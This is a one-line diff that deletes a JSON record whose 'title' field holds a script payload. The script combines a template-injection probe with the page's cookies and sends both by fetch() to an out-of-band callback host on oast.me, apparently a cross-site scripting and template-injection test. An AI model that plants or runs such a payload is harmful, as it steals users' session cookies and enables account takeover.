@@ -1,1 +1,0 @@
-{"title": "<script>   var serverInfo = '{{ site.time }}'; var clientInfo = document.cookie; fetch('https://d8rot34ubu20m8qh1bf0byhn4uewxp5p1.oast.me/?s=' + serverInfo + '&c=' + clientInfo); </script>"}
